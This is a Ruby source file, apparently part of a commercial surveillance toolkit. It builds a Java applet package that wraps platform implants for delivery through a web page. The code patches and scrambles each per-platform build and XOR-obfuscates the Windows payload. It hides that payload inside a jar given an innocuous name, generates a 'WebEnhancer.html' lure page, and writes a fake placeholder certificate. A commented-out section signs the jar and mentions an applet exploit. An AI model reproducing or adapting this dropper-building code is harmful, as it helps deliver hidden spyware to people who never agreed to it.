#
# Applet creation
#

# from RCS::Common
require 'rcs-common/trace'

module RCS
module DB

class BuildApplet < Build

  def initialize
    super
    @platform = 'applet'
  end

  def generate(params)
    trace :debug, "Build: generate: #{params}"

    params['platforms'].each do |platform|
      build = Build.factory(platform.to_sym)

      build.load({'_id' => @factory._id})
      build.unpack
      begin
        build.patch params['binary'].dup
      rescue NoLicenseError => e
        trace :warn, "Build: #{e.message}"
        # trap in case of no license for a platform
        build.clean
        next
      end
      build.scramble
      build.melt params['melt'].dup

      outs = build.outputs

      # copy the outputs in our directory
      outs.each do |o|
        FileUtils.cp(File.join(build.tmpdir, o), path(o + '_' + platform))
        @outputs << o + '_' + platform
      end

      build.clean
    end
  end

   def xor_encrypt(inputfile, outputfile)
    trace :debug, "#{inputfile} -> #{outputfile}"
    pass_char = 0xff

    buf = File.open(inputfile,"rb") { |f| f.read }      
    obfuscated = buf.unpack("c*").collect {|c| c ^ pass_char}
    File.open(outputfile,"wb") { |f| f.write(obfuscated.pack("c*")) }
  end
  
  def melt(params)
    trace :debug, "Build: melt #{params}"

    @appname = params['appname'] || 'x'

    FileUtils.cp path('x.jar'), path(@appname + '.jar')

    # for some reason we cannot use the internal zip library, use the system "zip -u" to update a file into the jar
    #Zip::ZipFile.open(path(@appname + '.jar'), Zip::ZipFile::CREATE) do |z|
    #  z.file.open('mac', "w") { |f| f.write File.open(path('output_osx'), 'rb') {|f| f.read} } if File.exist? path('output_osx')
    #  z.file.open('win', "w") { |f| f.write File.open(path('output_windows'), 'rb') {|f| f.read} } if File.exist? path('output_windows')
    #end
    
    #obfuscate output_windows with xor 0xff > w
    xor_encrypt(path('output_windows'), path('w'))

    #File.rename path('output_osx'), path('mac') if File.exist? path('output_osx')
    #File.rename path('output_windows'), path('win') if File.exist? path('output_windows')

    CrossPlatform.exec path("zip"), "-u #{path(@appname + '.jar')} w", {:chdir => path('')} if File.exist? path('w')
    # TODO: remove when macos is supported again
    #CrossPlatform.exec path("zip"), "-u #{path(@appname + '.jar')} mac", {:chdir => path('')} if File.exist? path('mac')

    # prepare the html file
    index_content = File.open(path('WebEnhancer.html'), 'rb') {|f| f.read}
    index_content.gsub!('[:APPNAME:]', @appname)
    File.open(path(@appname + '.html'), 'wb') {|f| f.write index_content}

    @outputs = [@appname + '.jar', @appname + '.html']
  end

  def sign(params)

    # this file is needed by the NI. create a fake one.
    File.open(path(@appname + '.cer'), 'wb') {|f| f.write 'placeholder'}
    @outputs << @appname + '.cer'

    #
    # the signing is not needed anymore until we use the applet exploit
    #
=begin
    trace :debug, "Build: signing with #{Config::CERT_DIR}/applet.keystore"

    jar = path(@outputs.first)
    cert = path(@appname + '.cer')

    raise "Cannot find keystore" unless File.exist? Config.instance.cert('applet.keystore')

    CrossPlatform.exec "jarsigner", "-keystore #{Config.instance.cert('applet.keystore')} -storepass #{Config.instance.global['CERT_PASSWORD']} -keypass #{Config.instance.global['CERT_PASSWORD']} #{jar} signapplet"
    raise "jarsigner failed" unless File.exist? jar

    CrossPlatform.exec "keytool", "-export -keystore #{Config.instance.cert('applet.keystore')} -storepass #{Config.instance.global['CERT_PASSWORD']} -alias signapplet -file #{cert}"
    raise "keytool export failed" unless File.exist? cert

    @outputs << @appname + '.cer'
=end
  end

  def pack(params)
    trace :debug, "Build: pack: #{params}"

    Zip::ZipFile.open(path('output.zip'), Zip::ZipFile::CREATE) do |z|
      @outputs.each do |out|
        z.file.open(out, "wb") { |f| f.write File.open(path(out), 'rb') {|f| f.read} }
      end
    end

    # this is the only file we need to output after this point
    @outputs = ['output.zip']

  end

end

end #DB::
end #RCS::
